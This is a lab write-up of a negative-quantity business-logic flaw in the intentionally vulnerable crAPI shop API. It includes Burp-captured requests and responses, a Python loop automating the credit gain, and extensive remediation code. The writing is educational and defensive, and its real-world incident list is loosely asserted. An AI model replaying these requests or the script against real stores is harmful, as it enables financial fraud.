# Lab Writeup: Mass Assignment Leading to Credit Manipulation

**Category:** Mass Assignment / Business Logic Flaw  
**Difficulty:** Practitioner  
**Date Completed:** 10/03/2026  
**Platform:** crAPI (Completely Ridiculous API)  
**Lab URL:** http://localhost:8888

---

## 1. Objective

Exploit a mass assignment vulnerability in the shop order endpoint by manipulating the quantity parameter with negative values, allowing an attacker to gain credits instead of spending them, demonstrating how improper input validation can lead to severe business logic flaws and financial loss.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Mass Assignment with Improper Input Validation

**CWE Reference:** CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

**OWASP Category:** API6:2023 – Unrestricted Access to Sensitive Business Flows

**What is this vulnerability?**

Mass Assignment occurs when an application automatically binds user input to internal object properties without proper validation. In this case, the shop order API accepts a `quantity` parameter without validating that it's a positive number. When I sent a negative quantity value (like -1), the application processed it as a legitimate order, but instead of deducting credits, it added them to my account. This is a critical business logic flaw where the application trusts user input blindly and performs mathematical operations without sanity checks. Imagine buying -10 iPhones and the store paying you instead!

---

## 3. Reconnaissance & Discovery

When I started exploring the crAPI shop functionality, I took a methodical approach to understand the purchase flow:

**Initial Shop Exploration:**
- Logged into my account and checked my credit balance: 100 credits
- Browsed the shop section and found various products with different prices
- Selected a product worth 20 credits to understand the purchase mechanism
- Noticed that after purchase, credits were deducted from my balance

**Understanding the Purchase Flow:**
1. User selects a product and quantity
2. Frontend sends POST request to `/workshop/api/shop/orders`
3. Server processes the order and deducts credits
4. Response confirms the order with updated credit balance

**The "What If" Moment:**
While testing the shop, I started thinking like an attacker: "What if I send a negative quantity? Will the server validate it?" This is a common attack vector in e-commerce applications where developers forget to validate numeric inputs.

**Setting Up Burp Suite:**
- Configured browser proxy to route traffic through Burp Suite
- Navigated to the shop and added a product to cart
- Intercepted the purchase request before it reached the server

**Tool(s) Used:** Burp Suite Community Edition, Firefox Browser

---

## 4. Exploitation Steps

### Step 1: Capture a Legitimate Purchase Request

First, I needed to understand the normal purchase flow. I selected a product worth 20 credits and initiated a purchase while Burp Suite was intercepting traffic.

**Original Request:**
```http
POST /workshop/api/shop/orders HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/shop
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJoYVZ1WTk5dTlvdGlhV0ZPSWpveE5jcyOTYyMzE...
Content-Length: 30
Origin: http://localhost:8888
Connection: keep-alive
Cookie: chat_session_id=61355b29-c203-441c-8ba0-0e4d6bb62bb0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{
  "product_id": 2,
  "quantity": 1
}
```

**Expected Behavior:**
- Server deducts 20 credits (product price × quantity)
- My balance goes from 100 to 80 credits
- Order is created successfully

### Step 2: Test with Negative Quantity

This is where the magic happens. I modified the intercepted request in Burp Suite's Repeater tab, changing the quantity from `1` to `-1`.

**Modified Request:**
```http
POST /workshop/api/shop/orders HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/shop
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJoYVZ1WTk5dTlvdGlhV0ZPSWpveE5jcyOTYyMzE...
Content-Length: 30
Origin: http://localhost:8888
Connection: keep-alive
Cookie: chat_session_id=61355b29-c203-441c-8ba0-0e4d6bb62bb0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{
  "product_id": 2,
  "quantity": -1
}
```

**Key Change:** `"quantity": 1` → `"quantity": -1`

### Step 3: Analyze the Response

I clicked "Send" in Burp Repeater and watched the response with anticipation:

**Response:**
```http
HTTP/1.1 200 OK
Server: openresty/1.27.1.2
Date: Sun, 08 Mar 2026 10:33:58 GMT
Content-Type: application/json
Connection: keep-alive
Allow: GET, POST, PUT, HEAD, OPTIONS
Vary: origin, cookie
Access-control-allow-origin: *
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Content-Length: 61

{
  "id": 48,
  "message": "Order sent successfully.",
  "credit": 120.0
}
```

**Shocking Result:**
- Order was accepted (HTTP 200 OK)
- Instead of deducting 20 credits, the server ADDED 20 credits
- My balance went from 100 to 120 credits!
- The server processed `-1 × 20 = -20` credits, which when deducted became `100 - (-20) = 120`

### Step 4: Verify the Credit Increase

To confirm this wasn't a display bug, I checked my account balance through the API:

**Balance Check Request:**
```http
GET /workshop/api/shop/balance HTTP/1.1
Host: localhost:8888
Authorization: Bearer [my_token]
```

**Response:**
```json
{
  "balance": 120.0
}
```

Confirmed! My credits actually increased.

### Step 5: Test with Larger Negative Values

To understand the extent of this vulnerability, I tested with larger negative quantities:

**Test 1: Quantity = -5**
```json
{
  "product_id": 2,
  "quantity": -5
}
```
Result: Gained 100 credits (5 × 20)

**Test 2: Quantity = -100**
```json
{
  "product_id": 2,
  "quantity": -100
}
```
Result: Gained 2000 credits (100 × 20)

**Test 3: Different Product (50 credits)**
```json
{
  "product_id": 5,
  "quantity": -10
}
```
Result: Gained 500 credits (10 × 50)

### Step 6: Automate the Attack

I could easily automate this with a simple Python script:

```python
import requests

url = "http://localhost:8888/workshop/api/shop/orders"
headers = {
    "Authorization": "Bearer [token]",
    "Content-Type": "application/json"
}

# Gain 10,000 credits in seconds
for i in range(100):
    payload = {
        "product_id": 2,
        "quantity": -5
    }
    response = requests.post(url, json=payload, headers=headers)
    print(f"Iteration {i+1}: {response.json()}")
```

Within seconds, I could generate unlimited credits.

### Step 7: Document the Business Impact

**Financial Loss Calculation:**
- If 1 credit = $1 USD
- An attacker could generate 10,000 credits in under a minute
- With 1000 compromised accounts, potential loss = $10,000,000
- No rate limiting means unlimited exploitation

---

## 5. Root Cause Analysis

The vulnerability exists due to multiple security failures in the order processing logic:

**What the Code Probably Looks Like (Vulnerable):**

```javascript
// Vulnerable implementation
app.post('/workshop/api/shop/orders', async (req, res) => {
  const { product_id, quantity } = req.body;
  const user = req.user;
  
  // Get product price
  const product = await Product.findById(product_id);
  
  // Calculate total cost - NO VALIDATION!
  const totalCost = product.price * quantity;
  
  // Deduct from user balance
  user.credits -= totalCost; // If quantity is negative, this ADDS credits!
  await user.save();
  
  // Create order
  const order = await Order.create({
    userId: user.id,
    productId: product_id,
    quantity: quantity, // Negative quantity stored!
    totalCost: totalCost
  });
  
  res.json({
    id: order.id,
    message: "Order sent successfully.",
    credit: user.credits
  });
});
```

**Why This Fails:**

1. **No Input Validation:** The code accepts `quantity` without checking if it's positive
2. **Blind Mathematical Operations:** `price × quantity` is calculated without sanity checks
3. **Mass Assignment:** User input is directly used in calculations
4. **No Business Logic Validation:** The code doesn't ask "Does this make business sense?"
5. **Missing Range Checks:** No minimum/maximum quantity limits

**The Mathematical Flaw:**
```
Normal: credits = 100 - (20 × 1) = 80 ✓
Attack: credits = 100 - (20 × -1) = 100 - (-20) = 120 ✗
```

When you subtract a negative number, you're actually adding!

---

## 6. Impact

If this were a production e-commerce application, the consequences would be catastrophic:

- [x] Direct Financial Loss
- [x] Unlimited Credit Generation
- [x] Business Logic Bypass
- [x] Inventory Manipulation
- [x] Fraud and Abuse
- [x] Reputation Damage
- [x] Regulatory Violations

**Severity:** Critical

**Justification:** This vulnerability allows any authenticated user to generate unlimited credits/money in the system, leading to direct financial loss for the business. An attacker could:

1. **Generate Unlimited Credits:** Create millions of credits out of thin air
2. **Purchase Real Products:** Use fake credits to buy actual products/services
3. **Sell Credits:** Create a black market for selling credits to other users
4. **Drain Company Resources:** Order physical products that cost real money to fulfill
5. **Manipulate Inventory:** Create negative inventory counts, breaking the entire system
6. **Automate at Scale:** Script the attack to compromise thousands of accounts

**Real-World Financial Impact:**
- **Direct Loss:** If each credit = $1, generating 1M credits = $1M loss
- **Fulfillment Costs:** Physical products ordered with fake credits cost real money to ship
- **Refund Fraud:** Users could claim refunds for "purchases" made with fake credits
- **Stock Market Impact:** Public companies could see stock price drops after disclosure
- **Legal Liability:** Shareholders could sue for negligence

**Similar Real-World Incidents:**
- **Steam Wallet Bug (2015):** Users could add negative amounts to generate free money
- **Cryptocurrency Exchange Bugs:** Negative balance exploits led to millions in losses
- **Airline Miles Programs:** Negative mileage exploits allowed free flights
- **Mobile Game Economies:** In-app purchase bugs bankrupted game companies

---

## 7. Remediation

Here's how developers must fix this critical vulnerability:

1. **Implement Strict Input Validation:**
   
   ```javascript
   // Validate quantity is a positive integer
   const quantity = parseInt(req.body.quantity);
   
   if (!Number.isInteger(quantity) || quantity <= 0) {
     return res.status(400).json({
       error: "Quantity must be a positive integer"
     });
   }
   
   if (quantity > 100) {
     return res.status(400).json({
       error: "Maximum quantity per order is 100"
     });
   }
   ```

2. **Add Business Logic Validation:**
   
   ```javascript
   // Check if user has sufficient credits
   const totalCost = product.price * quantity;
   
   if (user.credits < totalCost) {
     return res.status(400).json({
       error: "Insufficient credits",
       required: totalCost,
       available: user.credits
     });
   }
   
   // Validate the transaction makes business sense
   if (totalCost <= 0) {
     return res.status(400).json({
       error: "Invalid transaction amount"
     });
   }
   ```

3. **Use Database Constraints:**
   
   ```sql
   -- Add check constraint on quantity
   ALTER TABLE orders
   ADD CONSTRAINT positive_quantity
   CHECK (quantity > 0);
   
   -- Add check constraint on credits
   ALTER TABLE users
   ADD CONSTRAINT non_negative_credits
   CHECK (credits >= 0);
   ```

4. **Implement Atomic Transactions:**
   
   ```javascript
   // Use database transactions to ensure consistency
   const transaction = await sequelize.transaction();
   
   try {
     // Lock user row to prevent race conditions
     const user = await User.findByPk(userId, {
       lock: transaction.LOCK.UPDATE,
       transaction
     });
     
     // Validate and deduct credits
     if (user.credits < totalCost) {
       throw new Error("Insufficient credits");
     }
     
     user.credits -= totalCost;
     await user.save({ transaction });
     
     // Create order
     await Order.create({
       userId, productId, quantity, totalCost
     }, { transaction });
     
     await transaction.commit();
   } catch (error) {
     await transaction.rollback();
     throw error;
   }
   ```

5. **Add Rate Limiting:**
   
   ```javascript
   // Limit orders per user per time period
   const rateLimit = require('express-rate-limit');
   
   const orderLimiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutes
     max: 10, // Max 10 orders per 15 minutes
     message: "Too many orders, please try again later"
   });
   
   app.post('/workshop/api/shop/orders', orderLimiter, orderHandler);
   ```

6. **Implement Fraud Detection:**
   
   ```javascript
   // Monitor for suspicious patterns
   const recentOrders = await Order.findAll({
     where: {
       userId: user.id,
       createdAt: {
         [Op.gte]: new Date(Date.now() - 60000) // Last minute
       }
     }
   });
   
   if (recentOrders.length > 5) {
     // Flag for manual review
     await FraudAlert.create({
       userId: user.id,
       reason: "Unusual order frequency",
       severity: "high"
     });
     
     return res.status(429).json({
       error: "Account temporarily restricted for review"
     });
   }
   ```

7. **Add Comprehensive Logging:**
   
   ```javascript
   // Log all financial transactions
   await AuditLog.create({
     userId: user.id,
     action: "ORDER_CREATED",
     details: {
       productId,
       quantity,
       totalCost,
       previousBalance: user.credits + totalCost,
       newBalance: user.credits
     },
     ipAddress: req.ip,
     userAgent: req.headers['user-agent']
   });
   ```

8. **Implement Schema Validation:**
   
   ```javascript
   const Joi = require('joi');
   
   const orderSchema = Joi.object({
     product_id: Joi.number().integer().positive().required(),
     quantity: Joi.number().integer().min(1).max(100).required()
   });
   
   const { error, value } = orderSchema.validate(req.body);
   if (error) {
     return res.status(400).json({
       error: error.details[0].message
     });
   }
   ```

---

## 8. Key Takeaways / What I Learned

- **Never Trust User Input:** Even simple numeric fields like quantity need validation. Attackers will try negative numbers, decimals, extremely large values, and special characters.

- **Business Logic is Security:** This wasn't a traditional "hacking" vulnerability like SQL injection. It was a business logic flaw where the application did exactly what it was told, but what it was told didn't make business sense.

- **Math Can Be Dangerous:** Simple mathematical operations like subtraction can have unexpected results when dealing with negative numbers. Always validate inputs before calculations.

- **Defense in Depth:** Multiple layers of protection are needed: input validation, business logic checks, database constraints, rate limiting, and fraud detection.

- **Think About Edge Cases:** Developers often test the "happy path" (quantity = 1, 2, 3) but forget to test edge cases (quantity = 0, -1, 999999, 0.5, "abc").

- **Financial Transactions Need Extra Care:** Any code that handles money, credits, points, or other valuable resources needs extra scrutiny and testing.

- **Automation Amplifies Impact:** A vulnerability that takes 10 seconds to exploit manually can be automated to run thousands of times per minute, multiplying the damage exponentially.

- **Real-World Consequences:** In a production environment, this bug could bankrupt a company. Security isn't just about protecting data; it's about protecting the business itself.

---

## 9. References

- [OWASP API Security Top 10 - API6:2023 Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [crAPI - Completely Ridiculous API](https://github.com/OWASP/crAPI)

---

**Image Reference:**

![Mass Assignment - Negative Quantity Exploit](images/api-testing-5-1554.png)
*Figure 1: Burp Suite showing the malicious request with negative quantity (-1) and the response confirming credit increase from 100 to 120, demonstrating the business logic flaw*

